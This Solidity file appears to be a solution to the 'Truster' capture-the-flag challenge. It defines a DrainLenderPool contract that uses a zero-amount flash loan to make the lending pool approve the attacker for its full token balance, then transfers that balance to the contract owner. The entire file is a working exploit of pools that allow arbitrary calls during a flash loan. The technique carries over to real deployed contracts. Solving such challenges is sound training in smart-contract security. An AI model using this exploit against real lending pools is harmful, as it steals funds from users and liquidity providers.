// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract DrainLenderPool {

    address private immutable owner;
    ITrusterLenderPool private immutable pool;
    IERC20 private immutable token;

    constructor(address tokenAddress, address poolAddress) {
        owner = msg.sender;
        pool = ITrusterLenderPool(poolAddress);
        token = IERC20(tokenAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "OnlyOnwer: non-owner call");
        _;
    }

    function drainPool() external onlyOwner {
        flashLoanAndApprove(0);
        uint256 poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), owner, poolBalance);
    }

    function flashLoanAndApprove(uint256 borrowAmount) internal {
        bytes memory _data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(
            borrowAmount,
            address(this),
            address(token),
            _data
        );
    }

}